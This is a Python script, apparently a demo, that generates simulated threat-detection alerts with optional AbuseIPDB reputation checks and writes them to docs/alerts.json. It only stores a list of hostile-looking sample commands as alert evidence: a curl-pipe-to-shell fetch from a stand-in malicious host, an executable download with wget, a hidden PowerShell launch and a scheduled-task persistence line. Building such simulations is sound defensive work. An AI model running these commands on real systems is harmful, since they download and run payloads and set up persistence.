#!/usr/bin/env python3
# threat_alert_demo.py
# Simulates telemetry and writes docs/alerts.json
# If ABUSEIPDB_KEY env var is set it will check IP reputation (optional).
# Usage: python scripts/threat_alert_demo.py --output docs/alerts.json

import json
import random
import argparse
import os
from datetime import datetime, timezone

try:
    import requests
except Exception:
    requests = None

SAMPLE_IPS = [
    "45.77.142.12", "185.243.25.12", "167.99.40.11",
    "93.184.216.34", "104.21.23.45", "192.0.2.1"
]

SUSPECT_COMMANDS = [
    "powershell -nop -w hidden -c ...",
    "curl http://malicious.example/payload.sh | sh",
    "wget http://10.0.0.5/p.exe -O /tmp/p.exe",
    "schtasks /create /sc minute /tn Updater /tr C:\\Windows\\temp\\p.exe"
]

def check_ip_abuse(ip, key):
    if not requests:
        return {"score": None, "note": "requests not installed in env"}
    try:
        url = "https://api.abuseipdb.com/api/v2/check"
        headers = {"Key": key, "Accept": "application/json"}
        params = {"ipAddress": ip}
        r = requests.get(url, headers=headers, params=params, timeout=10)
        if r.status_code == 200:
            data = r.json().get("data", {})
            return {"score": data.get("abuseConfidenceScore"), "reports": data.get("totalReports")}
        else:
            return {"score": None, "note": f"AbuseIPDB HTTP {r.status_code}"}
    except Exception as e:
        return {"score": None, "note": str(e)}

def gen_alert():
    ip = random.choice(SAMPLE_IPS)
    cmd = random.choice(SUSPECT_COMMANDS)
    confidence = random.choice(["low","medium","high"])
    evidence = {
        "process": "powershell.exe" if "powershell" in cmd else "cmd.exe",
        "command": cmd,
        "source_ip": ip,
    }
    return {
        "id": f"alert-{random.randint(10000,99999)}",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "summary": f"{confidence.upper()} confidence: Suspicious command observed from {ip}",
        "confidence": confidence,
        "evidence": evidence,
    }

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", default="docs/alerts.json")
    parser.add_argument("--count", type=int, default=1, help="How many alerts to generate")
    args = parser.parse_args()

    alerts = [gen_alert() for _ in range(args.count)]

    abuse_key = os.environ.get("ABUSEIPDB_KEY")
    if abuse_key and requests:
        # enrich first alert's IP (optional, non-blocking)
        ip = alerts[0]["evidence"]["source_ip"]
        rep = check_ip_abuse(ip, abuse_key)
        alerts[0]["reputation"] = rep

    payload = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "count": len(alerts),
        "alerts": alerts
    }

    outpath = args.output
    os.makedirs(os.path.dirname(outpath) or ".", exist_ok=True)
    with open(outpath, "w") as f:
        json.dump(payload, f, indent=2)
    print(f"Wrote {outpath} with {len(alerts)} alert(s).")

if __name__ == "__main__":
    main()
